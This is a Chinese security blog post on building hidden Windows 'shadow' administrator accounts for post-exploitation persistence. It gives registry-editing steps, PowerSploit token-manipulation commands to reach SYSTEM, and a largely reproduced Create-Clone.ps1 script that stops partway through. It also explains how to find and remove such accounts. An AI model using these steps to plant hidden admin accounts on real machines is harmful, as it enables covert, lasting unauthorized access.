<!DOCTYPE HTML>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    <meta name="keywords" content="权限维持之影子账户, z1r0s 安全 Web安全 学习总结">
    <meta name="description" content="计算机 | 程序语言 | 网络安全 | 红蓝对抗">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>权限维持之影子账户 | z1r0s&#39;blogs</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>



   <style>
    body{
       background-image: url(/medias/bg.jpg);
       background-repeat:no-repeat;
       background-size:cover;
       background-attachment:fixed;
    }
</style>



<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">z1r0s&#39;blogs</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">z1r0s&#39;blogs</div>
        <div class="logo-desc">
            
            计算机 | 程序语言 | 网络安全 | 红蓝对抗
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/z1r0s" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/z1r0s" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/44.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">权限维持之影子账户</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        height: calc(100vh - 250px);
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/后渗透/">
                                <span class="chip bg-color">后渗透</span>
                            </a>
                        
                            <a href="/tags/权限维持/">
                                <span class="chip bg-color">权限维持</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/渗透测试/" class="post-category">
                                渗透测试
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2020-11-28
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2020-11-28
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    10.4k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    61 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="影子账户的定义"><a href="#影子账户的定义" class="headerlink" title="影子账户的定义"></a>影子账户的定义</h1><p>​        影子账户 顾名思义就是隐藏的账户，在【用户账户】里面看不见，但却有管理员权限的账户。影子账户这一概念随着Windows系统产生，在黑客技术里与后门安装（权限维持）技术挂钩。由于它的隐藏性强，入侵者多在被入侵的电脑里加这样的账户，用于远程登录以便控制客户机。</p>
<h1 id="影子账户的作用"><a href="#影子账户的作用" class="headerlink" title="影子账户的作用"></a>影子账户的作用</h1><ol>
<li><strong>认证绕过</strong>。在渗透的时候，拿到了服务器的管理员权限，但是没有拿到服务器上MSSQL数据库sa密码，且数据库也添加本地管理员来管理数据库时，想要得到数据库里面的信息，可以创建<code>Administrator</code>账户的影子账户，然后使用影子账户登录服务器，即可使用<code>Aministrator</code>的身份验证进入数据库，并且有非常大的权限。</li>
<li><strong>权限维持</strong>。影子账号和普通账户不一样，它是一个隐蔽的账号，在Windows 2003上面是很难发现和清除，在Windows 2008以上的影子账户<strong>只能在注册表中看到</strong>。但是影子账户有一个缺点就是在渗透测试时使用影子账户登录服务器如果改动了什么东西，<code>Administrator</code>登录后可以看到改动的结果。</li>
</ol>
<h1 id="创建影子账户"><a href="#创建影子账户" class="headerlink" title="创建影子账户"></a>创建影子账户</h1><h2 id="图形化方式创建"><a href="#图形化方式创建" class="headerlink" title="图形化方式创建"></a>图形化方式创建</h2><ol>
<li><p>创建一个名为<code>ss$</code>的用户，操作结果如下图所示。</p>
<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/创建新用户作为影子账户.png" alt="创建新用户作为影子账户"></center>
</li>
<li><p>使用<code>regedit</code>打开注册表<code>HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/</code>，显示结果如下图所示。<font color="blue">若打不开则需要设置权限，默认情况下SAM文件夹只有SYSTEM具有完全控制权限。</font></p>
<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/打开注册表.png" alt="打开注册表"></center>
</li>
<li><p>在<strong>Names</strong>文件夹中点击【<code>ss$</code>】，在右侧显示16进制数值如下图所示。</p>
<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/查看ss$用户.png" alt="查看ss$用户"></center>
</li>
<li><p>找到Administrator的十六进制数字，然后找到对应的00000（十六进制）文件夹打开，复制Administrator的<strong>000001F4</strong>文件夹里面的<strong>F值</strong>到我们的隐藏账户<code>ss$</code>里面的<strong>F值</strong>中，操作结果如下图所示。</p>
<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/影子账户修改F值.gif" alt="影子账户修改F值"></center>
</li>
<li><p>找到<strong>Names</strong>里面的<code>ss$</code>和<code>ss$</code>对应的十六进制目录，右键导出到桌面，操作结果如下如所示。</p>
<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/注册表导出.png" alt="注册表导出"></center>
</li>
<li><p>使用<code>net user ss$ /del</code>命令删除<code>ss$</code>用户，操作结果如下图所示。</p>
<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/删除ss$用户.png" alt="删除ss$用户"></center>
</li>
<li><p>将刚刚导出的注册表信息重新导入，操作结果如下图所示。</p>
<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/注册表导入.png" alt="注册表导入"></center>
</li>
<li><p>使用影子账户<code>ss$</code>登录，其实是以Administrator的身份登录，影子账户所做操作，Administrator都可以看见。</p>
<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/影子账户登录.png" alt="影子账户登录"></center>



</li>
</ol>
<h2 id="脚本方式创建"><a href="#脚本方式创建" class="headerlink" title="脚本方式创建"></a>脚本方式创建</h2><h3 id="方式1：对注册表添加管理员帐户的编辑权限"><a href="#方式1：对注册表添加管理员帐户的编辑权限" class="headerlink" title="方式1：对注册表添加管理员帐户的编辑权限"></a>方式1：对注册表添加管理员帐户的编辑权限</h3><p>​        直接使用<a href="https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Create-Clone.ps1" target="_blank" rel="noopener"><code>Create-Clone.ps1</code></a>脚本创建影子账户，但是需要管理员权限才可执行。</p>
<ul>
<li><p>运行条件：需要管理员权限</p>
</li>
<li><p>运行结果：</p>
<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/PermissionsMaintained/ShadowAccount/create-clone创建影子账户.png" alt="create-clone创建影子账户"></center>



</li>
</ul>
<h3 id="方式2：直接获得System权限"><a href="#方式2：直接获得System权限" class="headerlink" title="方式2：直接获得System权限"></a>方式2：直接获得System权限</h3><ol>
<li><p>使用<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1" target="_blank" rel="noopener"><code>Invoke-TokenManipulation.ps1</code></a>脚本先获得System权限，进而拥有对注册表的编辑权限。</p>
<pre class=" language-powershell"><code class="language-powershell"><span class="token punctuation">.</span> <span class="token punctuation">.</span>\Invoke<span class="token operator">-</span>TokenManipulation<span class="token punctuation">.</span>ps1
Invoke<span class="token operator">-</span>TokenManipulation <span class="token operator">-</span>CreateProcess <span class="token string">"cmd.exe"</span> <span class="token operator">-</span>Username <span class="token string">"nt authority\system"</span></code></pre>
<p>得到一个<code>SYSTEM</code>权限的<code>cmd.exe</code>程序。</p>
</li>
<li><p>在cmd中执行<a href="https://github.com/3gstudent/Windows-User-Clone" target="_blank" rel="noopener"><code>Windows-User-Clone.ps1</code></a>脚本，操作结果如下图所示。</p>
<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/PermissionsMaintained/ShadowAccount/以SYSTEM权限创建影子账户.png" alt="以SYSTEM权限创建影子账户"></center>



</li>
</ol>
<h1 id="影子账户利用思路"><a href="#影子账户利用思路" class="headerlink" title="影子账户利用思路"></a>影子账户利用思路</h1><ol>
<li><strong>克隆管理员Administrator账户权限</strong><ul>
<li>需要注意管理员帐户是否被禁用，如果被禁用，那么克隆出的隐藏帐户也是被禁用状态。</li>
</ul>
</li>
<li><strong>复制已有账户</strong><ul>
<li>在3389远程登录的利用上存在相同帐户的冲突关系</li>
<li>如果系统当前登录帐号为<code>a</code>，那么使用由账户a克隆来的隐藏帐户<code>aaa$</code>登录的话，会系统被识别为帐户<code>a</code>，导致帐户<code>a</code>下线</li>
</ul>
</li>
<li><strong>新建账户再复制</strong><ul>
<li>新建管理员帐户<code>b</code>，克隆帐户<code>b</code>，建立隐藏账户<code>bbb$</code></li>
<li>删除管理员帐户<code>b</code>，隐藏账户<code>bbb$</code>仍然有效</li>
</ul>
</li>
<li><strong>原账户的维持</strong><ul>
<li>克隆帐户<code>a</code>的权限，建立隐藏帐户<code>aaa$</code></li>
<li>修改帐户<code>a</code>的密码，隐藏帐户<code>aaa$</code>仍然有效</li>
</ul>
</li>
</ol>
<h1 id="查看影子账户"><a href="#查看影子账户" class="headerlink" title="查看影子账户"></a>查看影子账户</h1><ul>
<li>隐藏账户制作完成，控制面板不存在账户<code>ss$</code>；</li>
<li>通过<code>net user</code>无法列出改账户；</li>
<li>【计算机管理】→ 【本地用户和组】→ 【用户】也无法列出该帐户；</li>
<li><font color="blue">但可使用<code>net user ss$</code>命令查看影子账户信息</font>；</li>
<li><font color="blue">而且在注册表的<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>文件夹下也可以看到<code>ss$</code>账户信息（最有效的方式）</font>。</li>
<li>隐藏帐户的登录记录，可通过查看日志获取</li>
</ul>
<h1 id="删除影子账户"><a href="#删除影子账户" class="headerlink" title="删除影子账户"></a>删除影子账户</h1><ul>
<li>在注册表的<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>文件夹下删除指定用户名相关的文件夹和以十六进制命令的文件夹即可。</li>
</ul>
<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>Create-Clone.ps1脚本内容如下所示：</p>
<pre class=" language-powershell"><code class="language-powershell"><span class="token keyword">function</span> Create<span class="token operator">-</span>Clone
<span class="token punctuation">{</span>
<span class="token comment" spellcheck="true">&lt;#
.SYNOPSIS
This script requires Administrator privileges. use Invoke-TokenManipulation.ps1 to get system privileges and create the clone user.
.PARAMETER u
The clone username
.PARAMETER p
The clone user's password
.PARAMETER cu
The user to clone, default administrator 
.EXAMPLE
Create-Clone -u evi1cg -p evi1cg123 -cu administrator
#></span>
    <span class="token keyword">Param</span><span class="token punctuation">(</span>
        <span class="token namespace">[Parameter(Mandatory=$true)]</span>
        <span class="token namespace">[String]</span>
        <span class="token variable">$u</span><span class="token punctuation">,</span>

        <span class="token namespace">[Parameter(Mandatory=$true)]</span>
        <span class="token namespace">[String]</span>
        <span class="token variable">$p</span><span class="token punctuation">,</span>

        <span class="token namespace">[Parameter(Mandatory=$false)]</span>
        <span class="token namespace">[String]</span>
        <span class="token variable">$cu</span> = <span class="token string">"administrator"</span>
    <span class="token punctuation">)</span>
    <span class="token keyword">function</span> upReg<span class="token punctuation">{</span>
        <span class="token string">"HKEY_LOCAL_MACHINE\SAM [1 17]"</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token variable">$env</span>:temp\up<span class="token punctuation">.</span>ini
        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM [1 17]"</span><span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>Append  <span class="token variable">$env</span>:temp\up<span class="token punctuation">.</span>ini
        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1 17]"</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>Append  <span class="token variable">$env</span>:temp\up<span class="token punctuation">.</span>ini
        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1 17] "</span><span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>Append  <span class="token variable">$env</span>:temp\up<span class="token punctuation">.</span>ini
        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1 17] "</span><span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>Append  <span class="token variable">$env</span>:temp\up<span class="token punctuation">.</span>ini
        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [1 17]"</span><span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>Append  <span class="token variable">$env</span>:temp\up<span class="token punctuation">.</span>ini
        cmd <span class="token operator">/</span>c <span class="token string">"regini <span class="token variable">$env</span>:temp\up.ini"</span>
        <span class="token function">Remove-Item</span> <span class="token variable">$env</span>:temp\up<span class="token punctuation">.</span>ini

    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> downreg <span class="token punctuation">{</span>
        <span class="token string">"HKEY_LOCAL_MACHINE\SAM [1 17]"</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token variable">$env</span>:temp\down<span class="token punctuation">.</span>ini
        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM [17]"</span><span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>Append  <span class="token variable">$env</span>:temp\down<span class="token punctuation">.</span>ini
        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains [17]"</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>Append  <span class="token variable">$env</span>:temp\down<span class="token punctuation">.</span>ini
        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [17] "</span><span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>Append  <span class="token variable">$env</span>:temp\down<span class="token punctuation">.</span>ini
        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [17] "</span><span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>Append  <span class="token variable">$env</span>:temp\down<span class="token punctuation">.</span>ini
        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [17]"</span><span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token operator">-</span>Append  <span class="token variable">$env</span>:temp\down<span class="token punctuation">.</span>ini
        cmd <span class="token operator">/</span>c <span class="token string">"regini <span class="token variable">$env</span>:temp\down.ini"</span>
        <span class="token function">Remove-Item</span> <span class="token variable">$env</span>:temp\down<span class="token punctuation">.</span>ini
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> Create<span class="token operator">-</span>user <span class="token punctuation">(</span><span class="token namespace">[string]</span><span class="token variable">$Username</span><span class="token punctuation">,</span><span class="token namespace">[string]</span><span class="token variable">$Password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$group</span> = <span class="token string">"Administrators"</span>
        <span class="token variable">$existing</span> = <span class="token function">Test-Path</span> <span class="token operator">-</span>path <span class="token string">"HKLM:\SAM\SAM\Domains\Account\Users\Names\<span class="token variable">$Username</span>"</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$existing</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">Write-Host</span> <span class="token string">"[*] Creating new local user <span class="token variable">$Username</span> with password <span class="token variable">$Password</span>"</span>
            &amp; NET USER <span class="token variable">$Username</span> <span class="token variable">$Password</span> <span class="token operator">/</span>add <span class="token operator">/</span>y <span class="token operator">/</span>expires:never <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
            <span class="token function">Write-Host</span> <span class="token string">"[*] Adding local user <span class="token variable">$Username</span> to <span class="token variable">$group</span>."</span>
            &amp; NET LOCALGROUP <span class="token variable">$group</span> <span class="token variable">$Username</span> <span class="token operator">/</span>add <span class="token punctuation">|</span> <span class="token function">Out-Null</span>

        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">Write-Host</span> <span class="token string">"[*] Adding existing user <span class="token variable">$Username</span> to <span class="token variable">$group</span>."</span>
            &amp; NET LOCALGROUP <span class="token variable">$group</span> <span class="token variable">$Username</span> <span class="token operator">/</span>add <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
            <span class="token variable">$adsi</span> = <span class="token namespace">[ADSI]</span><span class="token string">"WinNT://<span class="token variable">$env</span>:COMPUTERNAME"</span>
            <span class="token variable">$exist</span> = <span class="token variable">$adsi</span><span class="token punctuation">.</span>Children <span class="token punctuation">|</span> where <span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">.</span>SchemaClassName <span class="token operator">-eq</span> <span class="token string">'user'</span> <span class="token operator">-and</span> <span class="token variable">$_</span><span class="token punctuation">.</span>Name <span class="token operator">-eq</span> <span class="token variable">$Username</span> <span class="token punctuation">}</span>
            <span class="token function">Write-Host</span> <span class="token string">"[*] Setting password for existing local user <span class="token variable">$Username</span>"</span>
            <span class="token variable">$exist</span><span class="token punctuation">.</span>SetPassword<span class="token punctuation">(</span><span class="token variable">$Password</span><span class="token punctuation">)</span> 
        <span class="token punctuation">}</span>

        <span class="token function">Write-Host</span> <span class="token string">"[*] Ensuring password for <span class="token variable">$Username</span> never expires."</span>
        &amp; WMIC USERACCOUNT WHERE <span class="token string">"Name='<span class="token variable">$Username</span>'"</span> <span class="token function">SET</span> PasswordExpires=FALSE   <span class="token punctuation">|</span> <span class="token function">Out-Null</span>  
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> GetUser<span class="token operator">-</span>Key<span class="token punctuation">(</span><span class="token namespace">[string]</span><span class="token variable">$user</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        cmd <span class="token operator">/</span>c <span class="token string">" echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\<span class="token variable">$user</span> [1 17] >> <span class="token variable">$env</span>:temp\<span class="token variable">$user</span>.ini"</span>
        cmd <span class="token operator">/</span>c <span class="token string">"regini <span class="token variable">$env</span>:temp\<span class="token variable">$user</span>.ini"</span>
        <span class="token function">Remove-Item</span> <span class="token variable">$env</span>:temp\<span class="token variable">$user</span><span class="token punctuation">.</span>ini
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">Test-Path</span> <span class="token operator">-</span>Path <span class="token string">"HKLM:\SAM\SAM\Domains\Account\Users\Names\<span class="token variable">$user</span>"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            cmd <span class="token operator">/</span>c <span class="token string">"regedit /e <span class="token variable">$env</span>:temp\<span class="token variable">$user</span>.reg "</span>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\<span class="token variable">$user</span><span class="token string">""</span>
            <span class="token variable">$file</span> = <span class="token function">Get-Content</span> <span class="token string">"<span class="token variable">$env</span>:temp\<span class="token variable">$user</span>.reg"</span>  <span class="token punctuation">|</span> <span class="token function">Out-String</span>
            <span class="token variable">$pattern</span>=<span class="token string">"@=hex\((.*?)\)\:"</span>
            <span class="token variable">$file</span> <span class="token operator">-match</span> <span class="token variable">$pattern</span> <span class="token punctuation">|</span><span class="token function">Out-Null</span>
            <span class="token variable">$key</span> = <span class="token string">"00000"</span><span class="token operator">+</span><span class="token variable">$matches</span><span class="token punctuation">[</span>1<span class="token punctuation">]</span>
            <span class="token function">Write-Host</span> <span class="token string">"[!]"</span><span class="token variable">$key</span>
            <span class="token keyword">return</span> <span class="token variable">$key</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">Write-Host</span> <span class="token string">"[-] SomeThing Wrong !"</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> Clone <span class="token punctuation">(</span><span class="token namespace">[string]</span><span class="token variable">$ukey</span><span class="token punctuation">,</span><span class="token namespace">[string]</span><span class="token variable">$cukey</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\<span class="token variable">$ukey</span> [1 17] "</span><span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token variable">$env</span>:temp\f<span class="token punctuation">.</span>ini
